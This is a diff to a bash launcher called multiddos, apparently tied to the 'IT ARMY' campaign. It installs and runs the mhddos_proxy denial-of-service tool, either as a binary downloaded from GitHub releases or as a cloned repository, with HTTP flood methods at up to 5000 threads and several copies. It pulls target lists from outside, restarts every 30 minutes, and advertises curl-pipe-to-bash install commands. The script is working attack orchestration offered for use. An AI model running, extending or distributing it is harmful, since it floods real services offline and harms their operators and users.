@@ -1,18 +1,20 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.1e\n"
+clear && echo -e "Loading... v1.2\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder 
+rm -rf ~/multidd*; mkdir -p ~/multidd/targets/ ; cd ~/multidd # clean working folder
+
+sudo sysctl -w net.ipv4.ip_local_port_range="16384 65535" # increasing thread limit
 
 gotop="on"
 db1000n="off"
 vnstat="off"
 proxy_finder="off"
 export methods="--http-methods GET STRESS"
-export ddos_size="L"
+export ddos_size="AUTO"
 
 # create swap file if system doesn't have it. Helps systems with very little RAM.
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
@@ -60,10 +62,18 @@ clear
 toilet -t --metal "Український"
 toilet -t --metal "   жнець"
 toilet -t --metal " MULTIDDOS"
-typing_on_screen 'Шукаю завдання...' ; sleep 0.5
-echo -e "\n\nTotal targets found:" "\x1b[32m $(cat ~/multidd/targets/all_targets.txt | wc -l)\x1b[m" && sleep 0.1
-echo -e "Uniq targets:" "\x1b[32m $(cat ~/multidd/targets/uniq_targets.txt | wc -l)\x1b[m" && sleep 0.1
-echo -e "\nЗавантаження..."; sleep 2
+
+if [[ $mhddos_mode == "new" ]]; then
+    typing_on_screen 'Шукаю завдання від IT ARMY...' && sleep 2&
+    cd ~/multidd/
+    wget -q https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
+    chmod +x mhddos_proxy_linux
+else
+    typing_on_screen 'Шукаю завдання...' ; sleep 0.5
+    echo -e "\n\nTotal targets found:" "\x1b[32m $(cat ~/multidd/targets/all_targets.txt | wc -l)\x1b[m" && sleep 0.1
+    echo -e "Uniq targets:" "\x1b[32m $(cat ~/multidd/targets/uniq_targets.txt | wc -l)\x1b[m" && sleep 0.1
+    echo -e "\nЗавантаження..."; sleep 2
+fi
 clear
 }
 export -f prepare_targets_and_banner
@@ -115,6 +125,7 @@ while [ "$1" != "" ]; do
         --XL ) export ddos_size="XL"; shift ;;
         --XXL  | --2XL) export ddos_size="XXL"; shift ;;
         --XXXL | --3XL) export ddos_size="XXXL"; shift ;;
+        --new ) export mhddos_mode="new"; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
         *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
@@ -126,8 +137,31 @@ prepare_targets_and_banner
 cd ~/multidd
 cat > auto_bash.sh << 'EOF'
 # Restart and update mhddos_proxy and targets every 30 minutes
-while true; do
-    #install mhddos_proxy
+# pkill -f mhddos_proxy_linux
+
+if [[ $mhddos_mode == "new" ]]; then
+    cd ~/multidd/
+
+    if [[ $ddos_size == "AUTO" ]]; then
+        ./mhddos_proxy_linux --copies auto $args_to_pass
+    elif [[ $ddos_size == "XS" ]]; then
+        ./mhddos_proxy_linux -t 1000 $args_to_pass
+    elif [[ $ddos_size == "S" ]]; then
+        ./mhddos_proxy_linux -t 2000 $args_to_pass
+    elif [[ $ddos_size == "M" ]]; then
+        ./mhddos_proxy_linux --copies 2 -t 2000 $args_to_pass
+    elif [[ $ddos_size == "L" ]]; then
+        ./mhddos_proxy_linux --copies auto -t 4000 $args_to_pass
+    elif [[ $ddos_size == "XL" ]]; then
+        ./mhddos_proxy_linux --copies 4 -t 3000 $args_to_pass
+    elif [[ $ddos_size == "XXL" ]]; then
+        ./mhddos_proxy_linux --copies 4 -t 4000 $args_to_pass
+    elif [[ $ddos_size == "XXXL" ]]; then
+        ./mhddos_proxy_linux --copies 4 -t 5000 $args_to_pass
+    fi
+
+else
+    while true; do
     cd ~/multidd/
     git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
     cd ~/multidd/mhddos_proxy
@@ -171,12 +205,12 @@ while true; do
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xac.uaripper $methods -t 5000 $args_to_pass &
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c ~/multidd/targets/xad.uaripper $methods -t 5000 $args_to_pass &
     fi
-    
-sleep 60m
-pkill -f start.py; pkill -f runner.py;
-prepare_targets_and_banner
-rm -rf ~/multidd/mhddos_proxy/
-done
+    sleep 30m
+    pkill -f start.py; pkill -f runner.py;
+    prepare_targets_and_banner
+    rm -rf ~/multidd/mhddos_proxy/
+    done
+fi
 EOF
 
 launch
